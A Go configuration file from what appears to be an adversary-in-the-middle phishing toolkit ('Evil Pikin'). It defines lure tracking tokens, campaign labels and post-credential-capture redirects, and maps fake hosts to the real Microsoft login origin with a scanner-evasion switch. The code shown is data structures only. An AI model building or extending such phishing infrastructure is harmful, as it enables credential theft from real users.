// Package config holds the thread-safe runtime parameters shared between the
// control plane and the proxy/data-plane workers. Evil Pikin keeps all mutable
// deployment state here so operators can update targets, the base domain, and
// the server IP from the TUI without restarting the engine.
package config

// LureInstance is the operator-facing description of a single phishing lure. It
// is intentionally decoupled from the internal lure registry so the control
// plane, TUI, persistence layer, and the multi-tenant RuntimeRegistry can all
// serialize / handle it independently.
//
// The Token is the cryptographic tracking key carried in the query string
// (e.g. "?id=a8f3") or, after first touch, inside the EP_SESS cookie.
// TargetID links the lure back to the phishing host / target profile it unlocks
// (e.g. "microsoft" or "login.ms.test"). Label is a free-form campaign tag
// (e.g. "Finance_Dept_Campaign"). RedirectURL is the post-compromise landing
// page the victim is shipped to after credentials are captured.
type LureInstance struct {
	Token       string `json:"token"`        // Cryptographic query/path tracking key (e.g. "id=a8f3")
	TargetID    string `json:"target_id"`    // Links back to the parent Phishlet Profile
	Label       string `json:"label"`        // Custom identifier (e.g. "Finance_Dept_Campaign")
	RedirectURL string `json:"redirect_url"` // Post-compromise landing page
	Hits        int64  `json:"hits"`
	IsActive    bool   `json:"is_active"`
}

// TargetSpec declares a single phishing target for the multi-tenant runtime.
// IncomingHost is the hostname the victim hits (e.g. "login.ms.test");
// UpstreamHost is the real origin it is proxied to (e.g.
// "login.microsoftonline.com"). RequireLure toggles scanner-evasion for this
// specific target.
type TargetSpec struct {
	IncomingHost string
	UpstreamHost string
	RequireLure  bool
}

// Targets returns a snapshot of every currently mapped phishing host. It is a
// convenience accessor for the multi-target schema so callers (TUI, registrar)
// can enumerate the live tenant set without reaching into the private map.
func (c *RuntimeConfig) Targets() []string {
	c.mu.RLock()
	defer c.mu.RUnlock()
	if c.TargetMapping == nil {
		return nil
	}
	out := make([]string, 0, len(c.TargetMapping))
	for k := range c.TargetMapping {
		out = append(out, k)
	}
	return out
}
